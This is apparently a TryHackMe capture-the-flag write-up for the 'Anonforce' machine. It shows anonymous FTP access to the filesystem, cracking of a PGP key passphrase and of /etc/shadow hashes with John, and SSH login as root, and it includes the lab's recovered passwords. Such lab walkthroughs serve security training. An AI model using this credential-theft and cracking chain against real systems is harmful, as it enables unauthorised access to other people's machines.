# Anonforce

## 1. Introduction

### 1.1 Background

Anonforce is a TryHackMe boot2root machine designed to test enumeration, service analysis, and cryptographic exploitation skills.

The scenario involves a system with a misconfigured FTP service that allows anonymous access to the entire file system structure. This service contains sensitive files, including a PGP-encrypted backup and its corresponding private key.

### 1.2 Objectives

- Enumerate the services exposed on the target machine
- Access the FTP service using anonymous authentication
- Decrypt information protected by PGP
- Escalate privileges to obtain root access

---

## 2. Enumeration

### 2.1 Nmap

A port scan is performed to identify active services:

```
nmap -sVC -p- <IP>
```

Results:

```
21/tcp open ftp vsftpd3.0.3
22/tcp open ssh OpenSSH7.2p2 Ubuntu
```

Key findings:

- FTP allows anonymous access
- SSH service available for remote access

---

## 3. Exploitation

### 3.1 FTP Access and Abuse of Encrypted Backup

The FTP service is accessed using anonymous credentials:

```
ftp <IP>
Name: anonymous
Password: anonymous
```

Access to the system root (`/`) is observed within the system, which is a critical misconfiguration.


The folder is located:

```
/notread
```

With permissions:

```
drwxrwxrwx (777)
```

The following files are found inside:

- `backup.pgp`
- `private.asc`

Both are downloaded:

```
get backup.pgp
get private.asc
```

### 3.2 Cracking the PGP Key

The private key is converted into a crackable format:

```
gpg2john private.asc > hash
```

Cracking with John:

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```
xbox360
```

### Decrypting the Backup

The key is imported:

```
gpg --import private.asc
```

The file is decrypted:

```
gpg --decrypt backup.pgp
```

The contents of `/etc/shadow` are obtained:

```
root:$6$...
melodias:$1$...
```

### 3.4 Credential Cracking

The hashes are extracted and cracked with John:

```
john hash2 --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```
root:hikari
```

---

## 4. Post-Exploitation

### 4.1 Root Access

With the obtained credentials, access is gained via SSH:

```
ssh root@<IP>
```

Password:

```
hikari
```

Full access is obtained system and the final flag is recovered.
